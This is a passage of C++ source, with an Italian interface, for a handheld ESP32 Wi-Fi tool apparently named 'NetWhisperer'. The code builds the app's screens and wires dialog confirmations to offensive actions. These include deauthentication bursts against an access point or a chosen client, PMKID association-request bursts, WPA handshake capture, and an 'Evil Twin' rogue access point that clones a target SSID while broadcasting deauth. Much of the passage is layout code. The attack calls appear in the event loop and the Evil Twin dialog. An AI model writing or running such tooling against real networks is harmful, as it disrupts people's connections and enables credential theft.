            auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
            char ssid[33] = {};
            bool active = false;
            if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
                auto it = ctx->seen.find(ctx->selectedKey);
                if (it != ctx->seen.end()) {
                    strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                }
                active = ctx->evilTwinActive;
                ctx->mutex.unlock();
            }
            char msg[160];
            if (!active) {
                snprintf(msg, sizeof(msg), "Attivare Evil Twin Rogue AP per \"%s\"?\nClonera l'SSID e avviera il deauth broadcast.",
                    ssid[0] != '\0' ? ssid : "(nascosta)");
            } else {
                snprintf(msg, sizeof(msg), "Disattivare l'Evil Twin Rogue AP?");
            }
            ctx->evilTwinDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Evil Twin", msg, { active ? "Disattiva" : "Attiva", "Annulla" });
        }, LV_EVENT_CLICKED, ctx);

        // 6. Dettagli ET (48% - accanto a Evil Twin)
        ctx->detailEvilTwinDetailsButton = lv_button_create(etGridContainer);
        lv_obj_set_width(ctx->detailEvilTwinDetailsButton, LV_PCT(48));
        lv_obj_set_height(ctx->detailEvilTwinDetailsButton, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_ver(ctx->detailEvilTwinDetailsButton, 6, 0);
        lv_obj_set_style_radius(ctx->detailEvilTwinDetailsButton, 4, 0);
        lv_obj_set_style_border_width(ctx->detailEvilTwinDetailsButton, 1, 0);
        lv_obj_set_style_border_color(ctx->detailEvilTwinDetailsButton, lv_color_hex(0x505050), 0);
        lv_obj_set_style_bg_color(ctx->detailEvilTwinDetailsButton, lv_color_hex(0x181818), 0);
        lv_obj_set_style_bg_opa(ctx->detailEvilTwinDetailsButton, LV_OPA_COVER, 0);
        lv_obj_add_flag(ctx->detailEvilTwinDetailsButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
        auto* etDetLbl = lv_label_create(ctx->detailEvilTwinDetailsButton);
        lv_label_set_text(etDetLbl, LV_SYMBOL_SETTINGS " Dettagli ET");
        lv_obj_center(etDetLbl);
        lv_obj_add_event_cb(ctx->detailEvilTwinDetailsButton, onShowEvilTwinDetail, LV_EVENT_CLICKED, ctx);

        auto* hsCard = createSectionCard(scroll, "Stato Cattura Handshake / PMKID");
        ctx->detailHsSummary = lv_label_create(hsCard);
        lv_label_set_text(ctx->detailHsSummary, "Stato -> HS: 0/4 | PMKID: NO");
        lv_obj_set_width(ctx->detailHsSummary, LV_PCT(100));
    }

    // 2. Schede informative con titolo in azzurro
    auto* idCard = createSectionCard(scroll, "Informazioni Rete");
    ctx->detailSsidLabel = lv_label_create(idCard);
    ctx->detailMacLabel = lv_label_create(idCard);

    auto* secCard = createSectionCard(scroll, "Sicurezza e Canale");
    ctx->detailSecLabel = lv_label_create(secCard);
    ctx->detailChanLabel = lv_label_create(secCard);

    auto* sigCard = createSectionCard(scroll, "Segnale e Distanza");
    ctx->detailPowerLabel = lv_label_create(sigCard);
    ctx->detailPhyLabel = lv_label_create(sigCard);

    auto* techCard = createSectionCard(scroll, "Statistiche e Attivita");
    ctx->detailTimeLabel = lv_label_create(techCard);
    ctx->detailDeauthLabel = lv_label_create(techCard);

    for (auto* lbl : {ctx->detailSsidLabel, ctx->detailMacLabel, ctx->detailSecLabel, ctx->detailChanLabel, ctx->detailPowerLabel, ctx->detailPhyLabel, ctx->detailTimeLabel, ctx->detailDeauthLabel}) {
        if (lbl) {
            lv_obj_set_width(lbl, LV_PCT(100));
            lv_label_set_long_mode(lbl, LV_LABEL_LONG_MODE_WRAP);
            lv_obj_set_style_pad_all(lbl, 0, 0);
        }
    }

    // 3. Pulsante Connetti in fondo
    ctx->connectButton = lv_button_create(scroll);
    lv_obj_set_width(ctx->connectButton, LV_PCT(100));
    lv_obj_set_height(ctx->connectButton, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_ver(ctx->connectButton, 8, 0);
    lv_obj_set_style_radius(ctx->connectButton, 4, 0);
    lv_obj_set_style_border_width(ctx->connectButton, 1, 0);
    lv_obj_set_style_border_color(ctx->connectButton, lv_color_hex(0x505050), 0);
    lv_obj_set_style_bg_color(ctx->connectButton, lv_color_hex(0x181818), 0);
    lv_obj_set_style_bg_opa(ctx->connectButton, LV_OPA_COVER, 0);
    lv_obj_add_flag(ctx->connectButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    auto* connLbl = lv_label_create(ctx->connectButton);
    lv_label_set_text(connLbl, LV_SYMBOL_WIFI " Connetti");
    lv_obj_center(connLbl);
    lv_obj_add_event_cb(ctx->connectButton, onConnectPressed, LV_EVENT_CLICKED, ctx);
}

void createClientsPage(Context* ctx, lv_obj_t* parent) {
    ctx->clientsPage = createPage(parent);
    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);

    auto* header = lv_obj_create(ctx->clientsPage);
    lv_obj_set_size(header, LV_PCT(100), 18);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(header, 2, 0);
    lv_obj_set_style_pad_column(header, 4, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);

    auto* macHdr = lv_label_create(header);
    lv_label_set_text(macHdr, "Client (MAC)");
    lv_obj_set_flex_grow(macHdr, 1);

    addLegendLabel(header, "dBm", COL_CDBM);
    addLegendLabel(header, "TX", COL_TX);
    addLegendLabel(header, "RX", COL_RX);

    auto* indHdr = lv_label_create(header);
    lv_obj_set_width(indHdr, COL_IND);
    lv_label_set_text(indHdr, "");

    ctx->clientsList = lv_list_create(ctx->clientsPage);
    lv_obj_set_width(ctx->clientsList, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->clientsList, 1);
    lv_obj_set_style_pad_all(ctx->clientsList, 0, 0);
    lv_obj_set_style_pad_row(ctx->clientsList, 2, 0);
}

void createGraphPage(Context* ctx, lv_obj_t* parent) {
    ctx->graphPage = createPage(parent);

    auto* mainRow = lv_obj_create(ctx->graphPage);
    lv_obj_set_size(mainRow, LV_PCT(100), LV_PCT(100));
    lv_obj_set_flex_flow(mainRow, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(mainRow, 0, 0);
    lv_obj_set_style_pad_column(mainRow, 4, 0);
    lv_obj_set_style_border_width(mainRow, 0, 0);
    lv_obj_remove_flag(mainRow, LV_OBJ_FLAG_SCROLLABLE);

    auto* leftColumn = lv_obj_create(mainRow);
    lv_obj_set_flex_flow(leftColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_height(leftColumn, LV_PCT(100));
    lv_obj_set_flex_grow(leftColumn, 1);
    lv_obj_set_style_pad_all(leftColumn, 0, 0);
    lv_obj_set_style_border_width(leftColumn, 0, 0);
    lv_obj_remove_flag(leftColumn, LV_OBJ_FLAG_SCROLLABLE);

    auto* statusBar = lv_obj_create(leftColumn);
    lv_obj_set_size(statusBar, LV_PCT(100), 20);
    lv_obj_set_flex_flow(statusBar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(statusBar, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_hor(statusBar, 2, 0);
    lv_obj_set_style_pad_ver(statusBar, 0, 0);
    lv_obj_set_style_border_width(statusBar, 0, 0);
    lv_obj_set_style_bg_opa(statusBar, LV_OPA_TRANSP, 0);
    lv_obj_remove_flag(statusBar, LV_OBJ_FLAG_SCROLLABLE);

    ctx->modeBadge = lv_obj_create(statusBar);
    lv_obj_set_size(ctx->modeBadge, LV_SIZE_CONTENT, 16);
    lv_obj_set_style_pad_hor(ctx->modeBadge, 6, 0);
    lv_obj_set_style_pad_ver(ctx->modeBadge, 0, 0);
    lv_obj_set_style_radius(ctx->modeBadge, 4, 0);
    lv_obj_set_style_border_width(ctx->modeBadge, 0, 0);
    lv_obj_set_style_bg_color(ctx->modeBadge, lv_color_hex(0x282828), 0);
    lv_obj_set_style_bg_opa(ctx->modeBadge, LV_OPA_COVER, 0);
    lv_obj_remove_flag(ctx->modeBadge, LV_OBJ_FLAG_SCROLLABLE);

    ctx->modeBadgeLabel = lv_label_create(ctx->modeBadge);
    lv_label_set_text(ctx->modeBadgeLabel, "STOP");
    lv_obj_set_style_text_color(ctx->modeBadgeLabel, lv_color_hex(0x888888), 0);
    lv_obj_center(ctx->modeBadgeLabel);

    ctx->statsLabel = lv_label_create(statusBar);
    lv_obj_set_flex_grow(ctx->statsLabel, 1);
    lv_obj_set_style_pad_left(ctx->statsLabel, 6, 0);
    lv_obj_set_style_text_color(ctx->statsLabel, lv_color_hex(0xD4D4D8), 0);
    lv_label_set_text(ctx->statsLabel, "0 AP");

    ctx->statusLabel = ctx->statsLabel;

    auto* chartWrapper = lv_obj_create(leftColumn);
    lv_obj_set_width(chartWrapper, LV_PCT(100));
    lv_obj_set_flex_grow(chartWrapper, 1);
    lv_obj_set_style_pad_all(chartWrapper, 0, 0);
    lv_obj_set_style_border_width(chartWrapper, 0, 0);
    lv_obj_remove_flag(chartWrapper, LV_OBJ_FLAG_SCROLLABLE);

    ctx->chart = lv_chart_create(chartWrapper);
    lv_obj_set_size(ctx->chart, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->chart, 0, 0);
    lv_chart_set_type(ctx->chart, LV_CHART_TYPE_LINE);
    lv_chart_set_point_count(ctx->chart, CHART_POINTS);
    lv_chart_set_axis_range(ctx->chart, LV_CHART_AXIS_PRIMARY_Y, 0, SIGNAL_RANGE_DB);
    lv_chart_set_div_line_count(ctx->chart, 3, 0);
    lv_obj_set_style_size(ctx->chart, 0, 0, LV_PART_INDICATOR);
    lv_obj_set_style_line_width(ctx->chart, 2, LV_PART_ITEMS);
    lv_obj_remove_flag(ctx->chart, LV_OBJ_FLAG_SCROLLABLE);
    for (int i = 0; i < MAX_SERIES; i++) {
        ctx->series[i] = lv_chart_add_series(ctx->chart, lv_color_hex(SERIES_COLORS[i]), LV_CHART_AXIS_PRIMARY_Y);
        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
    }

    createChannelGrid(chartWrapper);

    ctx->activeChannelIndicator = lv_obj_create(chartWrapper);
    lv_obj_set_size(ctx->activeChannelIndicator, 14, LV_PCT(100));
    lv_obj_set_style_border_width(ctx->activeChannelIndicator, 1, 0);
    lv_obj_set_style_border_color(ctx->activeChannelIndicator, lv_color_hex(0x06B6D4), 0);
    lv_obj_set_style_radius(ctx->activeChannelIndicator, 3, 0);
    lv_obj_set_style_bg_color(ctx->activeChannelIndicator, lv_color_hex(0x06B6D4), 0);
    lv_obj_set_style_bg_opa(ctx->activeChannelIndicator, LV_OPA_20, 0);
    lv_obj_remove_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_remove_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);

    createYAxisLabels(chartWrapper);

    ctx->labelLayer = lv_obj_create(chartWrapper);
    lv_obj_set_size(ctx->labelLayer, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->labelLayer, 0, 0);
    lv_obj_set_style_bg_opa(ctx->labelLayer, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(ctx->labelLayer, 0, 0);
    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_CLICKABLE);

    createAxisLabels(leftColumn);

    constexpr int BTN = 40;
    auto* rightColumn = lv_obj_create(mainRow);
    lv_obj_set_size(rightColumn, BTN, LV_PCT(100));
    lv_obj_set_flex_flow(rightColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(rightColumn, 0, 0);
    lv_obj_set_style_pad_row(rightColumn, 4, 0);
    lv_obj_set_style_border_width(rightColumn, 0, 0);
    lv_obj_remove_flag(rightColumn, LV_OBJ_FLAG_SCROLLABLE);

    ctx->scanButton = createIconButton(rightColumn, LV_SYMBOL_WIFI, onStartScan, ctx, BTN);
    ctx->captureButton = createIconButton(rightColumn, LV_SYMBOL_EYE_OPEN, onStartCapture, ctx, BTN);
    ctx->stopButton = createIconButton(rightColumn, LV_SYMBOL_STOP, onStop, ctx, BTN);
    createIconButton(rightColumn, LV_SYMBOL_LIST, onShowList, ctx, BTN);
    refreshModeButtons(ctx);
}

void createListPage(Context* ctx, lv_obj_t* parent) {
    ctx->listPage = createPage(parent);
    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);

    auto* header = lv_obj_create(ctx->listPage);
    lv_obj_set_size(header, LV_PCT(100), 18);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(header, 2, 0);
    lv_obj_set_style_pad_column(header, 4, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    auto* spacer = lv_obj_create(header);
    lv_obj_set_size(spacer, 6, 1);
    lv_obj_set_style_border_width(spacer, 0, 0);
    lv_obj_set_style_bg_opa(spacer, LV_OPA_TRANSP, 0);
    auto* nameHdr = lv_label_create(header);
    lv_label_set_text(nameHdr, "Rete");
    lv_obj_set_flex_grow(nameHdr, 1);
    addLegendLabel(header, "ch", COL_CH);
    addLegendLabel(header, "d/s", COL_POWER);
    addLegendLabel(header, "sec", COL_SEC);
    addLegendLabel(header, "cli", COL_CLI);

    ctx->list = lv_list_create(ctx->listPage);
    lv_obj_set_width(ctx->list, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->list, 1);
    lv_obj_set_style_pad_all(ctx->list, 0, 0);
    lv_obj_set_style_pad_row(ctx->list, 2, 0);
}

void showPage(Context* ctx, Page page) {
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        ctx->page = page;
        ctx->mutex.unlock();
    }

    lv_obj_add_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);

    switch (page) {
        case Page::Graph:
            lv_obj_remove_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "NetWhisperer");
            break;
        case Page::List:
            lv_obj_remove_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Reti rilevate");
            break;
        case Page::Detail:
            lv_obj_remove_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Dettaglio rete");
            if (ctx->detailScroll != nullptr) {
                lv_obj_scroll_to_y(ctx->detailScroll, 0, LV_ANIM_OFF);
                if (ctx->detailClientsButton != nullptr) {
                    lv_group_focus_obj(ctx->detailClientsButton);
                }
            }
            updateDetail(ctx);
            break;
        case Page::Clients:
            lv_obj_remove_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Client della rete");
            for (auto& [k, w] : ctx->clientRows) lv_obj_delete(w);
            ctx->clientRows.clear();
            updateClientsPage(ctx);
            if (ctx->clientsList != nullptr) lv_obj_scroll_to_y(ctx->clientsList, 0, LV_ANIM_OFF);
            break;
        case Page::EvilTwinDetail:
            lv_obj_remove_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
            if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, "Evil Twin Log & Client");
            updateEvilTwinDetailPage(ctx);
            break;
    }

    lvgl_toolbar_set_back_override(page == Page::Graph ? nullptr : onHardwareBack, ctx);
    updateLeds(ctx);
}

void updateViews(Context* ctx) {
    RadioMode mode;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }

    if (mode == RadioMode::Stopped) return;

    if (mode == RadioMode::ActiveScan) {
        auto activeResults = service::wifi::getScanResults();
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            mergeActiveScan(ctx, activeResults);
            ctx->mutex.unlock();
        }
    }

    std::vector<SeenAp> aps;
    std::map<uint64_t, int> clientCounts;
    std::map<uint64_t, uint32_t> dataTotals;
    size_t clientCount = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        aps = sortedByRssi(ctx);
        ctx->visible.clear();
        for (const auto& ap : aps) ctx->visible.push_back(bssidKey(ap.record.bssid));
        uint64_t now = nowMs();
        for (const auto& [clientKey, client] : ctx->clients) {
            if (client.associatedBssid != 0 && now - client.lastSeenMs <= ROW_EXPIRY_MS) {
                clientCounts[client.associatedBssid]++;
                dataTotals[client.associatedBssid] += (client.txCount + client.rxCount);
                clientCount++;
            }
        }
        ctx->mutex.unlock();
    }

    lvgl_lock();
    if (ctx->modeBadgeLabel != nullptr && ctx->statsLabel != nullptr) {
        char badgeText[16] = "STOP";
        uint32_t badgeBg = 0x282828;
        uint32_t badgeFg = 0x888888;
        char statsText[80] = "";

        if (!isRadioUsable()) {
            snprintf(badgeText, sizeof(badgeText), "OFF");
            badgeBg = 0x3F3F46;
            badgeFg = 0xD4D4D8;
            snprintf(statsText, sizeof(statsText), "Wi-Fi in avvio...");
        } else if (mode == RadioMode::Capture) {
#ifdef ESP_PLATFORM
            int hs = 0, pmkid = 0;
            if (ctx->mutex.lock(0)) { hs = ctx->handshakesSaved; pmkid = ctx->pmkidSeen; ctx->mutex.unlock(); }
            int lock = g_lockChannel.load();
            if (lock >= 1 && lock <= 13) {
                snprintf(badgeText, sizeof(badgeText), "LOCK %d", lock);
                badgeBg = 0xB91C1C;
                badgeFg = 0xFFFFFF;
            } else {
                snprintf(badgeText, sizeof(badgeText), "HOP %d", g_hopChannel.load());
                badgeBg = 0xDC2626;
                badgeFg = 0xFFFFFF;
            }
            if (pmkid > 0) {
                snprintf(statsText, sizeof(statsText), "%u AP | %u CLI | HS:%d P:%d",
                    (unsigned)aps.size(), (unsigned)clientCount, hs, pmkid);
            } else {
                snprintf(statsText, sizeof(statsText), "%u AP | %u CLI | HS:%d",
                    (unsigned)aps.size(), (unsigned)clientCount, hs);
            }
#else
            snprintf(badgeText, sizeof(badgeText), "SIM");
            badgeBg = 0xDC2626;
            badgeFg = 0xFFFFFF;
            snprintf(statsText, sizeof(statsText), "%u AP | %u CLI", (unsigned)aps.size(), (unsigned)clientCount);
#endif
        } else if (mode == RadioMode::ActiveScan) {
            snprintf(badgeText, sizeof(badgeText), "SCAN");
            badgeBg = 0x16A34A;
            badgeFg = 0xFFFFFF;
            snprintf(statsText, sizeof(statsText), "%u AP rilevati%s", (unsigned)aps.size(),
                service::wifi::isScanning() ? "..." : "");
        } else {
            snprintf(badgeText, sizeof(badgeText), "STOP");
            badgeBg = 0x282828;
            badgeFg = 0x888888;
            snprintf(statsText, sizeof(statsText), "%u AP (fermo)", (unsigned)aps.size());
        }

        lv_label_set_text(ctx->modeBadgeLabel, badgeText);
        lv_obj_set_style_bg_color(ctx->modeBadge, lv_color_hex(badgeBg), 0);
        lv_obj_set_style_text_color(ctx->modeBadgeLabel, lv_color_hex(badgeFg), 0);
        lv_label_set_text(ctx->statsLabel, statsText);
    }

    Page page;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        page = ctx->page;
        ctx->mutex.unlock();
    } else {
        lvgl_unlock();
        return;
    }

    if (page == Page::Graph) updateGraph(ctx, aps);
    else if (page == Page::List) updateRows(ctx, aps, clientCounts, dataTotals);
    else if (page == Page::Detail) updateDetail(ctx);
    else if (page == Page::Clients) updateClientsPage(ctx);
    else if (page == Page::EvilTwinDetail) updateEvilTwinDetailPage(ctx);
    lvgl_unlock();

    updateLeds(ctx);
}

void onTimer(Context* ctx) {
    using enum service::wifi::RadioState;
    auto state = service::wifi::getRadioState();
    RadioMode mode;
    if (ctx->mutex.lock(0)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }

    if (state == Off && mode != RadioMode::Stopped) {
        service::wifi::setEnabled(true);
    } else if (mode == RadioMode::ActiveScan && (state == On || state == ConnectionActive) && !service::wifi::isScanning()) {
        service::wifi::scan();
    }

    if (mode == RadioMode::Capture) flushHandshakes(ctx);

    if (window_manager_get_state(ctx->window) == WINDOW_STATE_GRANTED) updateViews(ctx);
}

void stopTimer(Context* ctx) {
    std::unique_ptr<Timer> timer;
    std::unique_ptr<Timer> ledTimer;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        timer = std::move(ctx->timer);
        ledTimer = std::move(ctx->ledTimer);
        ctx->mutex.unlock();
    }
    if (timer) timer->stop();
    if (ledTimer) ledTimer->stop();
}

void onLedTimer(Context* ctx) {
    if (!ctx->vuFeeding.load()) return;
    int base = ctx->vuLevel.load();

    uint32_t sinceRefresh = (uint32_t)lv_tick_get() - ctx->vuRefreshTick.load();
    float swell = sinceRefresh < 600 ? 0.40f * (1.0f - (float)sinceRefresh / 600.0f) : 0.0f;
    int level = base + (int)(base * swell);
    if (level < 0) level = 0;
    if (level > 255) level = 255;

    service::neopixel::VuLevels levels{};
    levels.left = levels.right = levels.bass = levels.mid = levels.treble = (uint8_t)level;
    service::neopixel::setVuLevels(levels);
}

void createWidgets(lv_obj_t* parent, void* userData) {
    auto* ctx = static_cast<Context*>(userData);

    lv_obj_set_flex_flow(parent, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(parent, 0, LV_STATE_DEFAULT);

    ctx->toolbar = lvgl_toolbar_create(parent, "NetWhisperer");
    lvgl_toolbar_set_nav_action(ctx->toolbar, LV_SYMBOL_CLOSE, [](lv_event_t* e) {
        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
        Page current;
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            current = ctx->page;
            ctx->mutex.unlock();
        } else {
            return;
        }
        if (current == Page::Graph) {
            app_event_emit_close(ctx->appInstanceId);
        } else {
            goBack(ctx);
        }
    }, ctx);

    auto* wrapper = lv_obj_create(parent);
    lv_obj_set_flex_flow(wrapper, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_width(wrapper, LV_PCT(100));
    lv_obj_set_flex_grow(wrapper, 1);
    lv_obj_set_style_pad_all(wrapper, 4, 0);

    createGraphPage(ctx, wrapper);
    createListPage(ctx, wrapper);
    createDetailPage(ctx, wrapper);
    createClientsPage(ctx, wrapper);
    createEvilTwinDetailPage(ctx, wrapper);

    showPage(ctx, ctx->page);
}

void destroyWidgets(void* userData) {
    auto* ctx = static_cast<Context*>(userData);
    lvgl_toolbar_set_back_override(nullptr, nullptr);
    ctx->toolbar = nullptr;
    ctx->statusLabel = nullptr;
    ctx->modeBadge = nullptr;
    ctx->modeBadgeLabel = nullptr;
    ctx->statsLabel = nullptr;
    ctx->activeChannelIndicator = nullptr;
    ctx->graphPage = nullptr;
    ctx->chart = nullptr;
    ctx->labelLayer = nullptr;
    for (auto& series : ctx->series) series = nullptr;
    ctx->scanButton = nullptr;
    ctx->captureButton = nullptr;
    ctx->stopButton = nullptr;
    ctx->listPage = nullptr;
    ctx->list = nullptr;
    ctx->rows.clear();
    ctx->detailPage = nullptr;
    ctx->detailScroll = nullptr;
    ctx->detailClientsButton = nullptr;
    ctx->detailLockButton = nullptr;
    ctx->detailDeauthButton = nullptr;
    ctx->detailPmkidButton = nullptr;
    ctx->detailEvilTwinButton = nullptr;
    ctx->detailEvilTwinDetailsButton = nullptr;
    ctx->detailHsSummary = nullptr;
    ctx->detailSsidLabel = nullptr;
    ctx->detailMacLabel = nullptr;
    ctx->detailSecLabel = nullptr;
    ctx->detailChanLabel = nullptr;
    ctx->detailPowerLabel = nullptr;
    ctx->detailPhyLabel = nullptr;
    ctx->detailTimeLabel = nullptr;
    ctx->detailDeauthLabel = nullptr;
    ctx->connectButton = nullptr;
    ctx->clientsPage = nullptr;
    ctx->clientsList = nullptr;
    ctx->clientRows.clear();
    ctx->etDetailPage = nullptr;
    ctx->etStatusLabel = nullptr;
    ctx->etClientsList = nullptr;
    ctx->etLogToggleButton = nullptr;
}

int32_t appMain(int /*argc*/, char* /*argv*/[]) {
    uint32_t appInstanceId = app_scheduler_current_app_id();
    Context ctx;
    ctx.appInstanceId = appInstanceId;

    TaskEventGroup event_group {};
    task_event_group_construct(&event_group);

    AppEventSubscription sub {};
    check(app_event_subscribe(&sub, &event_group) == ERROR_NONE);

    ctx.window = window_manager_create_ext(appInstanceId, createWidgets, destroyWidgets, &ctx);

    service::wifi::setScanRecords(MAX_RECORDS);
    service::wifi::setAutoScanPaused(true);

    saveLedConfig(&ctx);

    g_active_scanner_ctx = &ctx;
    romhack_keypad_set_media_cb(onMediaKey);

    ctx.timer = std::make_unique<Timer>(Timer::Type::Periodic, REFRESH_MS, [&ctx] {
        onTimer(&ctx);
    });
    ctx.timer->start();

    ctx.ledTimer = std::make_unique<Timer>(Timer::Type::Periodic, 50, [&ctx] {
        onLedTimer(&ctx);
    });
    ctx.ledTimer->start();

    bool shouldClose = false;
    while (!shouldClose) {
        task_event_group_wait_any(&event_group, nullptr, portMAX_DELAY);

        AppEvent event {};
        while (app_event_poll(&sub, &event) == ERROR_NONE) {
            if (event.type == APP_EVENT_CLOSE) {
                shouldClose = true;
                break;
            } else if (event.type == APP_EVENT_RESULT) {
                if (event.result.launch_id == ctx.deauthDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    int channel = 0;
                    bool found = false;
                    RadioMode currentMode = RadioMode::Stopped;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto it = ctx.seen.find(ctx.selectedKey);
                        if (it != ctx.seen.end()) {
                            memcpy(bssid, it->second.record.bssid, 6);
                            channel = it->second.record.channel;
                            found = true;
                        }
                        currentMode = ctx.mode;
                        ctx.mutex.unlock();
                    }
                    if (found && channel >= 1 && channel <= 13) {
                        if (currentMode != RadioMode::Capture) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        sendDeauthBurstOnChannel(bssid, channel, nullptr);
                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                            ctx.deauthBurstsSent++;
                            ctx.mutex.unlock();
                        }
                    }
                } else if (event.result.launch_id == ctx.clientDeauthDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    uint8_t clientMac[6];
                    int channel = 0;
                    bool found = false;
                    RadioMode currentMode = RadioMode::Stopped;

                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto apIt = ctx.seen.find(ctx.selectedKey);
                        auto clientIt = ctx.clients.find(ctx.targetClientKey);
                        if (apIt != ctx.seen.end() && clientIt != ctx.clients.end()) {
                            memcpy(bssid, apIt->second.record.bssid, 6);
                            memcpy(clientMac, clientIt->second.mac, 6);
                            channel = apIt->second.record.channel;
                            found = true;
                        }
                        currentMode = ctx.mode;
                        ctx.mutex.unlock();
                    }

                    if (found && channel >= 1 && channel <= 13) {
                        if (currentMode != RadioMode::Capture) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        sendDeauthBurstOnChannel(bssid, channel, clientMac);
                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                            ctx.deauthBurstsSent++;
                            ctx.mutex.unlock();
                        }
                    }
                } else if (event.result.launch_id == ctx.pmkidDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    char ssid[33] = {};
                    int channel = 0;
                    bool found = false;
                    RadioMode currentMode = RadioMode::Stopped;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto it = ctx.seen.find(ctx.selectedKey);
                        if (it != ctx.seen.end()) {
                            memcpy(bssid, it->second.record.bssid, 6);
                            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                            channel = it->second.record.channel;
                            found = true;
                        }
                        currentMode = ctx.mode;
                        ctx.mutex.unlock();
                    }
                    if (found && channel >= 1 && channel <= 13) {
                        if (currentMode != RadioMode::Capture) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        sendAssociationRequestBurst(bssid, ssid, channel);
                    }
                } else if (event.result.launch_id == ctx.evilTwinDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    char ssid[33] = {};
                    int channel = 0;
                    bool found = false;
                    bool activate = false;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto it = ctx.seen.find(ctx.selectedKey);
                        if (it != ctx.seen.end()) {
                            memcpy(bssid, it->second.record.bssid, 6);
                            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
                            channel = it->second.record.channel;
                            found = true;
                        }
                        ctx.evilTwinActive = !ctx.evilTwinActive;
                        activate = ctx.evilTwinActive;
                        ctx.mutex.unlock();
                    }
